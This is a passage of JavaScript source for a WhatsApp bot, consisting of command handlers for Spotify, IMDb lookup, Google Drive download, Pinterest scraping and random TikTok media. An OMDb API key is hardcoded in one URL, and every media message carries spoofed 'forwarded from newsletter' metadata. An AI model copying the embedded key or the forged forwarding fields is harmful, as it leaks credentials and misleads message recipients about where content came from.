            waveform:  [100, 0, 100, 0, 100, 0, 100],
            fileName: "starking",
            contextInfo: {
              mentionedJid: [m.sender],
              externalAdReply: {
                title: `PLAYING TO ${name}`,
                body: botname,
                thumbnailUrl: coverimage,
                sourceUrl: king,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
        }        
        await AlyaBotInc.sendMessage(m.chat, doc, { quoted: m })
    } catch (error) {
        console.error('Error fetching Spotify data:', error)
        return replygcalya('*Error*')
    }
    }
    break
case 'imdb':
if (!text) return replygcalya(`_Name a Series or movie`)
await AlyaStickWait()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           AlyaBotInc.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
            case 'ebinary': {
if (!q) return replygcalya(`Send/reply text with captions ${prefix + command}`)
let { eBinary } = require('./lib/binary')
let eb = await eBinary(`${q}`)
replygcalya(eb)
}
break
case 'dbinary': {
if (!q) return replygcalya(`Send/reply text with captions ${prefix + command}`)
let { dBinary } = require('./lib/binary')
let db = await dBinary(`${q}`)
replygcalya(db)
}
break
case 'happymod':{
if (!q) return replygcalya(`Example ${prefix+command} Sufway surfer mod`)
await AlyaStickWait()
let kat = await scp2.happymod(q)
replygcalya(util.format(kat))
}
break
case 'gdrive': {
		if (!args[0]) return replygcalya(`Enter the Google Drive link`)
	await AlyaStickWait()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygcalya(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	AlyaBotInc.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replygcalya('Error: Check link or try another link') 
  }
}
break
case 'pinterest': case 'pin': {
  if (!text) return replygcalya(`Title?`);
  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: AlyaBotInc.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Randomize arrays
  let ult = res.splice(0, 5); // Takes the first 10 images from a randomized array
  let i = 1;
  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `_*Here is the result of: ${text}*_`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: botname
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: `Image - ${i++}`,
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }
  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});
  await AlyaBotInc.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
}
break
case 'pinterest2': {
if (!text) return replygcalya(`Use example ${prefix+ command} one piece`)
    const { googleImage } = require('@bochilteam/scraper')
    const anutrest = await googleImage(text)
    let image = anutrest[Math.floor(Math.random() * anutrest.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: image } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command} ${text}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'ringtone': {
		if (!text) return replygcalya(`Example : ${prefix + command} black rover`)
        let { ringtone }= require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		AlyaBotInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
case 'tiktokgirl':{
await AlyaStickWait()
var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokghea':{
await AlyaStickWait()
var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokbocil':{
await AlyaStickWait()
var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoknukhty':{
await AlyaStickWait()
var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoksantuy':{
await AlyaStickWait()
var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokkayes':{
await AlyaStickWait()
var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokpanrika':{
await AlyaStickWait()
var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoknotnot':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'chinese':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'hijab':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'indo':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'japanese':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'korean':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'malay':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'randomgirl':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'randomboy':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'thai':{
await AlyaStickWait()
